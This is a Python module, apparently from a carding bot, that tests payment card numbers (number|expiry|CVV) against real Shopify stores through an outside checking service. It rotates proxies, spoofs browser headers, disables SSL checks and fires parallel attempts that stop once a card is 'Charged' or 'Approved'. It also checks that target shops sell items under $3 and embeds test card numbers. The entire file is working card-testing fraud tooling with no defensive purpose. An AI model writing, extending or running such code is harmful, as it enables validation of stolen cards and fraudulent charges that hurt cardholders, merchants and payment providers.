"""
check_engine.py — Shopify checker via check.yzio.app (configurable endpoints)
- Literal-pipe URL construction (| must not be %7C)
- 4 parallel attempts, 20s timeout each, cancel-on-first-hit
- Robust response parsing (JSON / plain-text / mixed)
- Site price verification (< $3 enforced on /addsite)
- Proxy format normalization (host:port, host:port:u:p, u:p@host:port)
"""
import asyncio
import aiohttp
import random
import json
import re
import os
import time
from urllib.parse import quote
from config import API_ENDPOINTS_FILE, DEFAULT_API_ENDPOINTS, PROXY_FILE

_session_bad_sites = set()
_error_log_path = "error.txt"

def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()

def clear_error_log():
    try:
        open(_error_log_path, 'w').close()
    except:
        pass

def _log_error_card(card, reason):
    try:
        with open(_error_log_path, 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except:
        pass

# ══════════════════════════════════════════════════════════════
# Endpoints config
# ══════════════════════════════════════════════════════════════
def load_api_endpoints() -> list:
    try:
        with open(API_ENDPOINTS_FILE) as f:
            eps = json.load(f).get('endpoints') or []
            return eps or list(DEFAULT_API_ENDPOINTS)
    except:
        return list(DEFAULT_API_ENDPOINTS)

def save_api_endpoints(endpoints: list):
    with open(API_ENDPOINTS_FILE, 'w') as f:
        json.dump({'endpoints': endpoints}, f, indent=2)

# ══════════════════════════════════════════════════════════════
# Proxy normalization
# ══════════════════════════════════════════════════════════════
def normalize_proxy(p: str) -> str:
    """
    Standardize to whatever format yzio accepts (pass-through).
      host:port              -> host:port
      host:port:user:pass    -> user:pass@host:port
      user:pass@host:port    -> user:pass@host:port
      http://...             -> http://...
    """
    p = (p or '').strip()
    if not p:
        return p
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return p
    if len(parts) == 4:
        # host:port:user:pass -> user:pass@host:port
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return p

def _proxy_to_url(p: str) -> str:
    """For aiohttp requests: http://user:pass@host:port"""
    p = (p or '').strip()
    if not p:
        return ''
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return f'http://{p}'
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

# ══════════════════════════════════════════════════════════════
# Result builder
# ══════════════════════════════════════════════════════════════
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status': status, 'message': message, 'card': card,
        'gateway': gateway, 'price': price, 'receipt_url': receipt_url,
        'retry': retryable, 'proxy': proxy, 'time': time,
    }

# ══════════════════════════════════════════════════════════════
# URL builder — LITERAL pipes, no %7C
# ══════════════════════════════════════════════════════════════
def _build_check_url(api_url: str, site: str, cc: str, proxy: str) -> str:
    # Encode only dangerous characters; keep :// in site, | in cc, :@ in proxy
    site_e  = quote(site.strip(),  safe=':/?=&%')     # sites: bare URL
    cc_e    = quote(cc.strip(),    safe='|')          # keep pipes literal
    proxy_e = quote(proxy.strip(), safe=':@')         # keep : and @ literal
    base = api_url.rstrip('/')
    return f"{base}/shopify?site={site_e}&cc={cc_e}&proxy={proxy_e}"

# ══════════════════════════════════════════════════════════════
# Response parsing — tolerant of every shape yzio returns
# ══════════════════════════════════════════════════════════════
def _extract_json(text: str):
    try:
        return json.loads(text)
    except Exception:
        pass
    m = re.search(r'\{[\s\S]*\}', text or '')
    if m:
        try:
            return json.loads(m.group(0))
        except Exception:
            pass
    return None

def _normalize_status(data: dict):
    if not isinstance(data, dict):
        return None

    for key in ('status', 'Status', 'state', 'result', 'Response'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            s = v.upper()
            if 'CHARG' in s or 'PAID' in s or 'CAPTURE' in s:
                return 'Charged'
            if 'APPROV' in s or 'LIVE' in s or 'AUTH' in s or 'SUCCESS' in s:
                return 'Approved'
            if 'DECLIN' in s or 'DEAD' in s or 'FAIL' in s or 'ERROR' in s or 'INVALID' in s:
                return 'Dead'

    if data.get('charged') is True or data.get('paid') is True:
        return 'Charged'
    if data.get('approved') is True:
        return 'Approved'
    if data.get('success') is True:
        # Could be Approved unless additional evidence
        if data.get('charged') is True:
            return 'Charged'
        return 'Approved'
    if data.get('success') is False or data.get('declined') is True:
        return 'Dead'
    return None

def _extract_message(data) -> str:
    if not isinstance(data, dict):
        return ''
    for key in ('message', 'msg', 'response', 'reason', 'error', 'detail', 'note'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            return v.strip()
        if isinstance(v, dict):
            for sub in ('message', 'msg', 'reason', 'detail'):
                sv = v.get(sub)
                if isinstance(sv, str) and sv.strip():
                    return sv.strip()
    return ''

def _extract_amount(data) -> str:
    if not isinstance(data, dict):
        return '-'
    for key in ('amount', 'price', 'total', 'Amount', 'Price', 'value'):
        v = data.get(key)
        if v is not None and v != '' and str(v).strip() not in ('-', 'None', 'null'):
            return str(v)
    return '-'

def _extract_gateway(data) -> str:
    if not isinstance(data, dict):
        return 'Shopify Payments'
    for key in ('gateway', 'Gateway', 'gate', 'payment_gateway'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            return v.strip()
    return 'Shopify Payments'

def _extract_receipt(data) -> str:
    if not isinstance(data, dict):
        return ''
    for key in ('receipt_url', 'receipt', 'receiptUrl', 'url'):
        v = data.get(key)
        if isinstance(v, str) and v.startswith('http'):
            return v
    return ''

# ══════════════════════════════════════════════════════════════
# One HTTP attempt — 20s hard cap
# ══════════════════════════════════════════════════════════════
async def _try_endpoint(api_url, shop_url, card, proxy_raw):
    url = _build_check_url(api_url, shop_url, card, proxy_raw)
    timeout = aiohttp.ClientTimeout(total=20, connect=6, sock_read=15)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    async with aiohttp.ClientSession(timeout=timeout) as s:
        async with s.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            http_status = r.status
            text = await r.text()

    data = _extract_json(text)

    # ── HTTP error
    if http_status != 200:
        msg = ''
        if isinstance(data, dict):
            msg = _extract_message(data)
        return _make_result(
            card, 'Dead',
            msg or f'HTTP {http_status}',
            retryable=500 <= http_status < 600,
        )

    # ── No JSON: try plain-text sniffing
    if data is None:
        up = (text or '').upper()
        if 'CHARG' in up or 'PAID' in up or 'CAPTURE' in up:
            return _make_result(card, 'Charged', text.strip()[:200], proxy=proxy_raw)
        if 'APPROV' in up or 'LIVE' in up or 'AUTH' in up:
            return _make_result(card, 'Approved', text.strip()[:200], proxy=proxy_raw)
        if 'DECLIN' in up or 'FAIL' in up or 'DEAD' in up:
            return _make_result(card, 'Dead', text.strip()[:200])
        snippet = (text or '').strip()[:80]
        return _make_result(card, 'Dead',
                            snippet or 'Empty response',
                            retryable=True)

    status  = _normalize_status(data)
    message = _extract_message(data)
    amount  = _extract_amount(data)
    gateway = _extract_gateway(data)
    receipt = _extract_receipt(data)

    if status is None:
        snippet = message or json.dumps(data)[:120]
        return _make_result(card, 'Dead', snippet, retryable=True)

    if status == 'Charged':
        return _make_result(card, 'Charged', message or 'Charged',
                            price=amount, gateway=gateway,
                            receipt_url=receipt, proxy=proxy_raw)
    if status == 'Approved':
        return _make_result(card, 'Approved', message or 'Approved',
                            price=amount, gateway=gateway, proxy=proxy_raw)
    return _make_result(card, 'Dead', message or 'Declined',
                        gateway=gateway, retryable=bool(data.get('retryable', False)))

async def _try_endpoint_safe(endpoint, site, card, proxy):
    try:
        return await _try_endpoint(endpoint, site, card, proxy)
    except asyncio.TimeoutError:
        return _make_result(card, 'Dead', 'timeout', retryable=True)
    except aiohttp.ClientConnectorError:
        return _make_result(card, 'Dead', 'api_unreachable', retryable=True)
    except Exception as e:
        return _make_result(card, 'Dead', f'{type(e).__name__}: {str(e)[:60]}', retryable=True)

# ══════════════════════════════════════════════════════════════
# PARALLEL card check — 4 attempts at once, cancel on hit
# ══════════════════════════════════════════════════════════════
async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')
    endpoints = load_api_endpoints()
    if not endpoints:
        return _make_result(card, 'Dead', 'No API endpoints configured')

    last_err = ''
    best_dead = None

    for _round in range(2):  # 2 rounds × 4 parallel = up to 8 attempts
        combos = [
            (random.choice(endpoints), random.choice(sites), random.choice(proxies))
            for _ in range(4)
        ]
        tasks = [
            asyncio.create_task(_try_endpoint_safe(ep, site, card, px))
            for ep, site, px in combos
        ]

        try:
            done, pending = await asyncio.wait(tasks, timeout=22,
                                               return_when=asyncio.FIRST_COMPLETED)
        except Exception:
            for t in tasks: t.cancel()
            continue

        # Evaluate first completed result; keep going until we hit a hit
        while done:
            for t in list(done):
                try:
                    r = t.result()
                except Exception:
                    continue
                if r is None:
                    continue
                if r['status'] in ('Charged', 'Approved'):
                    for p in pending: p.cancel()
                    return r
                if r['status'] == 'Dead' and not r.get('retry'):
                    if best_dead is None:
                        best_dead = r
                if not last_err and r.get('message'):
                    last_err = r['message']

            if best_dead:
                for p in pending: p.cancel()
                return best_dead

            if not pending:
                break
            try:
                done, pending = await asyncio.wait(pending, timeout=22,
                                                   return_when=asyncio.FIRST_COMPLETED)
            except Exception:
                for t in pending: t.cancel()
                break

        if best_dead:
            return best_dead

    _log_error_card(card, last_err or 'all_attempts_failed')
    return _make_result(card, 'Dead', last_err or 'Check failed — no usable response')

# ══════════════════════════════════════════════════════════════
# Site verification with price extraction
# ══════════════════════════════════════════════════════════════
_TEST_CARDS = [
    "5154623245618097|03|2032|156",
    "4263982640269299|02|2027|423",
    "4242424242424242|12|2029|123",
]

def _load_proxies_file():
    try:
        with open(PROXY_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []

async def test_site_with_price(site_url: str):
    """
    Returns (alive: bool, price: float|None, reason: str)
    Tries up to 3 test cards against 2 proxies.
    """
    endpoints = load_api_endpoints()
    if not endpoints:
        return False, None, 'No API endpoints configured'
    proxies = _load_proxies_file()
    if not proxies:
        return False, None, 'No proxies available — add proxies first'

    endpoint = random.choice(endpoints)
    best_price = None
    alive_seen = False
    reason = 'No response'

    for card in _TEST_CARDS[:2]:  # cap at 2 test cards
        for _ in range(2):  # 2 proxy tries each
            proxy = random.choice(proxies)
            try:
                result = await asyncio.wait_for(
                    _try_endpoint(endpoint, site_url, card, proxy),
                    timeout=22,
                )
            except asyncio.TimeoutError:
                reason = 'timeout'
                continue
            except Exception as e:
                reason = f'{type(e).__name__}'
                continue

            if result['status'] in ('Charged', 'Approved', 'Dead'):
                alive_seen = True
                price_str = str(result.get('price', '-')).replace('$', '').replace('USD', '').strip()
                try:
                    if price_str and price_str not in ('-', '', 'None', 'null'):
                        p = float(price_str)
                        if p > 0:
                            best_price = p if best_price is None else max(best_price, p)
                except Exception:
                    pass

                if best_price is not None:
                    return True, best_price, 'OK'

            reason = result.get('message', 'no usable response')[:80]

    if alive_seen:
        return True, best_price, 'Alive (price unknown)'
    return False, None, reason

async def test_site(site, proxy=None):
    """Legacy wrapper."""
    alive, price, reason = await test_site_with_price(site)
    return {'site': site, 'status': 'alive' if alive else 'dead',
            'msg': reason, 'price': price}

# ══════════════════════════════════════════════════════════════
# Proxy tester
# ══════════════════════════════════════════════════════════════
async def test_proxy(proxy: str) -> dict:
    url = _proxy_to_url(proxy)
    if not url:
        return {'proxy': proxy, 'status': 'dead'}
    targets = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for u in targets:
                try:
                    async with s.get(u, proxy=url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
    except Exception:
        pass
    return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str):
    url = _proxy_to_url(proxy)
    if not url or url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None
